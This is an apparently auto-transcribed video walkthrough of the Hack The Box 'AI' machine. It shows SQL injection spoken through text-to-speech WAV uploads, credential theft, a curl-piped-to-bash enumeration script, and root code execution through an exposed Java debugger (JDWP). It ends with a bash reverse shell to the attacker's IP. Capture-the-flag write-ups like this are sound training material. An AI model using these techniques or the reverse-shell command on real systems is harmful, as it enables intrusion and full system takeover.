 what's going on YouTube the zipsak I'm doing AI from hack the box which had a really interesting attack path the server itself is a speech-to-text things so you can upload at wav files with words spoken and then it will tell you what words were in that wav file so if you verbally spoke a sequel injection it didn't sanitize it when adding it to the database and you can actually perform a sequel injection that way it was a little bit frustrating trying to get the speech-to-text thing to identify exactly what words you wanted to say but I mean anyone who's ever interacted with a automated system for speech to text just always has horror stories and the attack path itself is really cool because I've always heard stories about people using sequel injections and unique ways for instance like at colleges where you have a bar code you can scan to get your account I've seen people put sequel injections in that bar code that when scanned always said they had money and their accounts or it could just get free lunches so that was getting user on the Box the prevx is going through a Java debug thing which is really cool I can't really explain it it's better just to show it so let's just jump in and do the Box as always we begin with an end map so - SC for default scripts as V enumerate versions Oh a output all formats put in the end map directory and call it AI and then the IP address which is 10 10 10 163 this can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on 422 and its banner tells us it a new Bond - server we also have HTTP on port 80 and it's banner tells us it's running Apache HTTP D version 2 4 - 9 we also get the nmap script HTTP - title running and it tells us the title of the page is hello - AI there's not really much information we can get from MF so let's just go take a look at the actual page navigating to 10-10-10 163 we get a page if we go to this top left we get a menu but before I go looking at that I just want to look at the source real quick to see if I see any like WP - which would indicate it's a wordpress page or something along those lines that would tell me what this is and i don't recognize any of the source so let's just go take a look at these pages so I'm going to open each one in a and notice each extension is PHP so because I always like doing some type of recon the background now's a good time to start off a go Buster so I'm going to go Buster - new HTTP 10-10-10 163 and I forgot to tell it dir mode I always forget that flag but after your L word list users share word list der Buster directory list to 3 medium text I'm gonna specify - x4 extension and do PHP because we know it's a PHP server and then - ooh 4 out file I'm just gonna call this go Buster root PHP I'll just something to tell me what I ran so with that being run let's go look at the actual pages so this about dot PHP says they're doing something with man that is annoying that Java Script voice recognition from audio files and then we have drop your query using WAV files so we select a file to upload and then we can process it so right away I'm just going to create test dot PHP and create a PHP script to say please subscribe so run that and I always try to do super basic PHP scripts first instead of going straight for like the reverse shell good for something like an echo because if they have like PHP safe mode enabled they may block your shell but they won't block yet go so just a little tip when we upload it we see understanding of your input is blah query result is blah so we don't really get anything the first thing I'm gonna do is try to go to like slash uploads to see if we can get to the file and we see it is a forbidden we don't have permission to access this and I do test dot PHP and it's not found so right off the bat I'm going to create a note so we'll call a I and then to do how our files stored that are uploaded this is gonna be a question I asked myself once I get on the box or if I need to dig further in because maybe it's like just putting a date/time stamp here and the name's not random so maybe you can guess it so once we get on the server we should definitely take a look at that and just see if we missed anything so and looking at contact PHP we get a note saying drop message to mr. reboot at 8:00 AIH DB which is a host name so I'm going to add this into my hosts file and see if anything new comes up so 10 10 10 163 AI dot H DB and we can go HTTP aih DB and we get the same exact page with nothing else so nothing there let's go take a look at our go Buster's see if we have anything new well we didn't know about images but that's just a 301 redirect so probably nothing special we can try ai dot h CB slash images and we just get forbidden okay index about contact uploads we knew about all these DB PHP we don't know about that one so we go to DB PHP it's just a blank page so that probably has all the like database login credentials and a PHP tag so you can't pull them if we had some type of like lfi vulnerability we may be able to get that file we have intelligence PHP which is one we did not know so let's go take a look at intelligence and it says your user input as below comment Oh AI output is comment idea design schema thought join merge Union 1 is 1 comma gets translated to that say hi Python gets translated this comment database so right now we're seeing a bunch of I guess aliases is the best way to explain this and if we go back to the upload it is telling us a WAV file to upload so my guess right now is we have to upload some type of text-to-speech thing so what I'm going to do is just go google go to google and then we can search for maybe linux version of say command say on Mac computers has a like text-to-speech thing so you just say say something and then it goes and does it so we can do I have to get install gnu GUI runtime so we can try this and this will give us the say command so base that to install it not found I wonder if I have to update my app depository so it didn't fully down with that app update let's update everything and then we'll run that again cuz it can't find this Lib wife one dead package so it's install this again yes and this time it looks like it worked so if you ever get app there is always just run app to update and now it is installing it and this triggers thing always takes a while but now it should be installed so if I have which say I do have it so if I do say dash H say hello I'm not hearing any sound so I'm just going to quickly take a look my volume is on let's go to my VM settings to make sure my audio is connected options now hardware sound could ah there we go so let's make sure that's connected and we can now do say hello hello and we get it responding however I don't know how to get se to actually go to a file if we do like say hello to test hello oh I type at that house funny hello but we don't really get anything if I look at the file test it is empty so let's try going to the next program down which is festival so we can do apt-get install festival and this gives us something called text to wave I believe and one of the cool things with app that you may not have which we'll do after this is apt file search so if there's ever a file you want executable you don't know the package name you can install the apt - file so app install app - file and we'll run this right after that finishes and then build the apt file repository and that will give you a way to search for files so once this installs we'll run this one and then go back into the text-to-speech things and I could have probably tried to get a recording application just record myself saying the things but based upon my interaction with other voice-to-text machines I don't do a good job and it's probably not repeatable for everyone that watches these videos where English is the main language and also I just don't know how to get my microphone piped into Kali and I didn't feel like researching that so that's why we're doing it this way by using a file to translate text into a sound into uploading it so now that we have apt file if we do apt - file update just like apt update this will build a file cache of everything and then once this is there we can just do app - file search and we'll search all our apt repositories for packages that contain the file we want so it's a really really handy thing and this may take longer to download than I thought there we go we got a file there so if we do app file search text to wave we can see that is provided by the package festival so that is what we're going to be using and that's what we just installed so we can do echo hello and pipe that to text to wave and then - oh I think for output let's just text to wave - H - oh is to save it so echo hello text to wave - OH task dot wave and if we don't do - OH text - I don't know this should have been a way to output that play through my speaker I bet if we open this file it'll work so open folder let's go to root where as htb box is a I test dot wave hello so we have that processing so if we go back to this AI program and the slash upload dot P a I dot PHP to upload a WAV file and this time we upload test dot wave process it we can see our understanding of your input is hello and it didn't get anything so let's try a sequel injection open single quote text - wave - OH test dot wave this play this and we get a sequel injection so we have a really really weird sequel injection right now and the first thing I want to do is try a union injection because if we get a union Jackson working then we can probably extract other data and yeah so we're gonna do open single quote Union select and I'm going to do version open parentheses close parentheses and then - - space - and we'll see if this works so we can go up loads upload this and we'll see what this guy thinks we said and we get single quote you can select so I guess it translated Union - you can select version and then it doesn't look like we have a space oh no we do have a space there I think or we have a space after each - so I wonder if we do I - - like that and upload it and see what he says I think the commas make him like take a small break and still an error message so if we went back to the intelligence PHP page there were a few things so if we look at this join is translated to Union so we can try just doing join instead of Union here and we can also probably hunt around for other text-to-speech things because eventually we'll find one this AI was trained with and get it working that way but it looks like the developers have the same problems we do so they did things like this so now we have single quote Union select version and we still have an error message because it's putting a space after each of the comments but again looking at this if we say comment and database and status - - space - thing I think it'll work so if as long as it understands us saying comment database so close parenthesis comment database and if we go back test dot wave process it and we get a result five seven twenty seven of Ubuntu so we successfully did Union ejection and I guess the query result is only returning one row because we didn't have to do multiple columns and thankfully we didn't have to because it would be such a pain doing all of this enumeration and this this I mean like enumeration like digging through doing OPA menses close comma 1 comma 2 comma 3 things like that would be just of a pain and I don't know why you race that whole line we just want to erase let's see let us put this end Cherrytree and I'm just gonna put come on new child node there we go working so this is this Union select version so that's what this is so what we want to do is get rid of version open includes and probably do like select username and try this we can do open parentheses select use name close parentheses and yeah we'll try this that will be Union select username so let's try this query go back erase this and then paste the new one desktop we've process and we have an error message it says selecting username so let's do a parenthesis select comma username does that change it oh we have to selects I should get rid of that let's go standing is that did not work would it get that - from I guess I thought join was - we won't put the comma and this is the fun of this box is trying to figure out how this works so let's go back to single quote join and we won't do parenthesis try it this way process Union select username unknown column use name and field list so we can try guessing the table so select username from users so let's guess that and you could we just do it from information underscore schema but you saw how long it took me to get a query write a new meringue that database would just be a hassle so user name is Alexa so let's do notes Alexa and let's get the password so select password from users process it and have curiosity what does this actually sound like open single quote join select password from user is common database that is not the best text-to-speech thing but we get a potential password so put that there and what we can do is go back to go Buster see if we found any login pages we have a few errors but no login pages it stopped at AI dot PHP there is SSH so we can do SSH Alexa at 10-10-10 163 and we go back here to copy this password paste it and this user does have a shell on the box so this is user text we do WCC we can get it do LS LA to see if there's anything else there's a dot SSH directory and that's just known host so the one thing I want to do is check ver dub dub dub HTML and let's go into uploads what is that Python script that caught my eye oh this is the voice translation what library they're using speech recognition as SR okay I don't know what library that is I was wondering if it's like Google provided something or what not if we look in uploads it is empty so for I and sec 0 would do like 10,000 do LS la done this is just a super super lazy way to do this piece so I'm gonna do a Windows key l to move that to the left windows key right to move that to the right and practice my shmoocon f5 in by trying to do this as quick as possible so we'll hit enter and click and it does upload that and it I guess just does a random file name so if we actually looked in the code which we pi should have done first but that was a fun way to do it Bai dot PHP now let's see query result lot upload tap name so it just takes a temp name from PHP and that is that so if we went back to uploads and did that same exact command and try to upload our PHP file 100 times it'll probably be a random string of digits and then dot maybe wave even yeah so no way to get coded execution that way because it's in the dot wave file wind I don't think it will execute that so not to mention that is a killer race condition so next thing to do I guess is to run Len peas for a privilege escalation check so make to dub dub dub CDW dub and then copy opt let's peel with all the things privilege escalation awesome sweet Len peas Lynn peas ssh to this directory Python 3 HTTP server 80 and we can curl 10 10 14 to which i think is my IP address if config tun 0 it is slash win pssh pipe it to bash and we'll let this one run it will take a little bit to run and go over the results to see this finds anything so now that's done I can use team ox to go to the beginning of me running it by just searching up for curl 10 and then here we'll just quickly go and take a look at things that are in colors because Lynn Pease has a really cool legend or al and I guess there's a typo in that version that's funny but yeah so path system stats environments nothing too interesting there nothing interesting some software compilers here we go so things that root is running is always interesting systemd not too interesting vm tools we have LX CFS so I should make sure my user is not a member of the LXE group because that's always an easy Prive esque if you want to see that one that's in calamity I don't believe I'm in that group but we'll find out soon enough going down we have some stuff by Alexa that's probably us another thing by root and it's highlighted and red and yellow which means this is most likely a Prevost vector and that is JD WP and we see agent Lib transport socket localhost:8080 WP is running on 8000 so JD WP 8000 and it's localhost so that's why our EM map didn't see it you also got Tomcat running as well I don't think I see port 8080 so we also have Tomcat so we definitely take a look at those two things if we can get credentials to write the Tomcat manager we can just upload a war file and get it to execute because it's running as roof if it executes what we upload then we'll get a root shell going down here just looking again so things in red we should take a look at we got MySQL and then these ports probably take a look at the MySQL database as well since we didn't do a good job at numerating that because it was text-to-speech and permit login so root login bunch of binaries - interesting so I'm probably just gonna go start taking a look at my sequel database and then we'll look at the Java stuff so for a dub dub dub HTML we want to look at DB PHP because this will have credentials so we'll call host DB user is the user towards the password Alexa is the database so you can do MySQL - you DB user - I think just P and then we can enter the password tour and then use Alexa we probably could have done - capital D and enter the database directly and sometimes you'll have to do that based upon how my sequel is configured but we can do show tables and we see Alexa end users if we describe Alexa there's two things so we can just do select star from Alexa and we just see I guess some stuff select star from users and we have a bunch of user names and passwords AWS credentials and a root password so let's just try logging in with this exit I just take control D control DS normally a safe bet to kill things so okay we can do su - put this in and authentication failure so I'm just going to copy this and we will put that there at then it pastes well but oh well and then I'm going to do SS - Ln PT this is like the netstat command just a new way to do it to see the open port so I want to afford eight thousand eight thousand five what is eight thousand five I don't know what that one is eight thousand nine and eighty eighty so eight thousand five I don't know that one 8009 is like JD WP or something or as JD WP what I'm just saying this is a DP or a JP a JP is what eight thousand nine is it is a tomcat redirector so you can use this as a see service since we're already on the box we don't need to proxy anything so we can ignore that 8080 is Tomcat itself and yeah so let's just forward three ports so we'll exit this I guess I could have done through the SSH command line we're due two ports this way and then one port through the SSH thing so I'm going to - capital L I'm going to say eight thousand nine localhost I will do ip's one twenty seven zero zero one eight thousand nine and 8081 27001 8080 and before this we also have to do - L this specifies local forward and then we'll login so if I do this password and before we do this we can do SS Ln PT and C I'm not listening on a ports well again SS Ln PT and we got two more ports open 8080 and eight thousand nine so if I go to one 2700 one port 8080 we get this Apache page I do manage your app we can try logging in with defaults tomcat tomcat and it doesn't let us in we could try like admin admin doesn't let us in so what we could do is find / - dev null to hide error messages gret tomcat to see if we can find where tomcat itself is and it's in opt Apache so we can go here and then go into this compactor II and we can so we don't know what the tomcat password is so let's go do the Java debugging port which was JD WP I think JD WP when pees what is it come on most processes so much information okay when peas yeah Jay DWP is the bug so do well before I do newline what I'm typing is I think that so newline do that and then I think I can type help here and it gives us the instructions so again newline squiggly see - L 8,000 localhost 8080 I'm not listening on port 8000 right now find a dress wait what oh I guess I took too long - L 8,000 localhost:8080 L 14 port and now I'm listening on port 8000 so in order to connect to this point we just dude j DB - - attach and then the port name which is 8,000 or maybe it's just one - and attach there we go and once we get shell we can run j DB commands and this is something you probably have to do some researching on your own but there's a bunch of things you can do like class path I can look at classes and here's all the classes that are loaded the one were mainly looking for is a runtime and it's this one java.lang runtime because this is a quick way to execute code and this is just a Java debugger think of like gdb for binaries but for Java so it lets us debug the job at JVM so this class path already being loaded means we can execute it so if we do methods java.lang runtime we can see all the things this provides and I think if you use like the open open source java that's default on most linux is the exact maybe slightly different so if you're in the jdb and do this look at this so we want to execute java lane runtime and then the exact method so that's what we want to execute but before we can execute this we have to be in a thread and we'll set go JD be detached so there is a common thread in this that we can just always attached to which we'll use probably won't do JD WP Shella fire but if you wanted to find your own we can do like go trace methods or trace go methods and there's going to tell us whenever we enter and exit something so we can do on trace to stop the trace that is un TR AC e on trace I thought it was maybe not untraced go methods well maybe it's queued up so many so if you're ever doing this type of exploit and attaching a debugger use the program we're gonna show after this I just kind of want to show you what's happening behind the scenes and then we'll do the automated program which is much safer because if you do it this way you may just cause a bunch of random things to hang and that is never good so right now I'm just looking for a method to set a breakpoint on so we can see method entered here one if I did go trace and I do threads and we trace a specific thread instead of everything if that would be more manageable on us I think there's a cron that restarts this constantly but here's something we can probably set a trace on so if we type threads does it bring back anything I would expect it show all the threads and there we go so you can see all the threads that are currently running so we could set breakpoints on each of these individual threads if we wanted to stop in let's just say method entered there's a good one to do guess we can try this so method and this I'm guessing this is if we hit the HTTP server unable to set breakpoint stop then pick another one job is not my best so I'm just picking random things and eventually we'll get something that we can actually set a breakpoint in there we go and breakpoint is it so now we can do print new java.lang runtime exec and touch slash temp slash please subscribe txt and if we look at Tim we don't have that file there ah it died before we can do it so let's copy and redo this I'm guessing because when you interact with jdb you can crash Tomcat so often that's why there's a cron that constantly does this thing so you just have to be quick please would I type that it is copy/paste at West one town maybe this thread doesn't have that print new java.lang runtime exec slash temp please subscribe that looks right continue let's exit and let's do the thread I normally do which is stop and Java Ling string index of and there we go and we should probably wait five to ten seconds to see if this stops if not then Tomcats probably in a weird state so there we go and let's just go back here copy the command we ran last time put it in LS LS / town still didn't execute let's see died on us again let's try this one last time I guess it's really picky what's read you in I should have done a bit more research in this attack stop on java.lang or stop in java.lang string and X sub I need and okay print new Java playing runtime exec bin touch tap please subscribe txt continue so a tam done xizt so what I'm going to do where's it one last time do a trace I'm gonna look for a different method as this dies so trace go methods I'm just going to let this run until it dies normally except we didn't get anything come on God's be with me tres go methods Tomcat must be in a weird state there we go Tomcats died so we can now attach back to it and trace go methods and now it's gonna print a bunch of things so I'm going to wait for this to die and then we're gonna go over exactly what the trace happened with what the trace gave us and we may get another thread that is better to inject into I'm thinking the reason why this isn't working is the thread doesn't have the Java Runtime loaded that'd be my guess so now that it's exited we can just search back for run time and actually we're getting it going all the way back to us so maybe that doesn't work Jay to be attached I know the definition of insanity is trying the same thing over and over and expecting different results but that's what we're going to be trying to do because Java is an insane language so we're going to do stop n java.lang string and X of n rent new java.lang runtime yes exec then touch tap please subscribe text see can hear messes at that time öso a Tim hey we got it so I'm not sure exactly what was going on but you can see we wrote it and root owns that file so that is that way of doing it and you can imagine you can probably just put like an SSH key or you can do a reverse shell you can run any command you want because all we did or is on touch but if you want to do it the safer way I'd recommend looking into the program JD WP - Stella fire yeah we can just CD opt get clone paste this in and if we python to execute it there's the flags at once so - t1 27001 - - break on java.lang string index of and the command we want to run let's just create CD temp V please work SH and we'll do bin bash bash - C - I dev tcp 1010 14 to 9,000 one zero and one like that I think MCL v NP 9001 sage mod + X please work ok we get a shell back so as long as this execute that command or that file it'll work please work Sh okay run this found runtime created the break event now it's waiting for it and there we go it executes the file and we have a root shell on AI WCC root text 33 and a line break so that is the video hope you guys enjoyed it take care and I will see you all next week